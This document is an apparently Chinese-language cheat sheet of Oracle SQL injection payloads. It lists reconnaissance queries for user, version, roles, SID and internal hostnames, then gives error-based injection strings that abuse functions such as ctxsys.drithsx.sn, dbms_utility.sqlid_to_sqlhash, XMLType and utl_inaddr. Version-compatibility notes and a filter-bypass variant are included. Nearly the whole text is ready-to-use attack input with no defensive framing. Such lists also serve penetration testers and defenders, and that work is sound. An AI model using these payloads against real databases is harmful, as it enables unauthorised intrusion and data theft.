`1.信息获取`

    select user from dual #当前用户
    SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';   #oracle版本
    select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
    select instance_name from v$instance#服务器sid 远程链接需要
    select utl_inaddr.get_host_name('127.0.0.1') from dual; #查询内网hostname win08dc.contoso.com
    SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;  #对外通信
    SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;
    select table_name from user_tables where lower(table_name)='books'   #查看books表书否存在
    
`2.Error Based(报错注入)`

    (10g or 11g)
    ' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--  
    and 1=(dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1))) and 1=1. 
    ' and 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4113=4113) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(107)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)--  
    ' and dbms_xdb_version.checkin((select user from dual))='1'--  
    ' and dbms_xdb_version.makeversioned((select user from dual))='1'--  
    ' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
    ' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
    ' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--     #user第一位是S ORA-01476: divisor is equal to zero 
    ' order by (SELECT (CASE WHEN (2434=2434||utl_inaddr.get_host_name((select banner from v$version where rownum=1))) THEN 2434 ELSE CAST(1 AS INT)/0 END) FROM DUAL)--%'  

    11g普通用户不能用的#utl_inaddr not work maybe acl(11g normal user) or java not installed etc
    '||utl_inaddr.get_host_address((select banner from v$version where rownum=1))||'    
    '||utl_inaddr.get_host_name((select banner from v$version where rownum=1))||'

    10g不能用的
    ' and dbms_aw_xml.readawmetadata((select sys_context('USERENV', 'SESSION_USER') from dual), null) is null --    #(11g 10g报错ORA-29532: Java call terminated by uncaught Java exception: java.lang.OutOfMemoryError)
    ' or dbMS_aW_xMl.reAdaWmetaData((select sYS_cONtExt('US' || 'ERENV', 'SESS' || 'ION_US' || 'ER') from dUAl), null) is null --# bypass 1
    ' and 1=(ordsys.ord_dicom.getmappingxpath((select user from dual),user,user))-- 
    
    
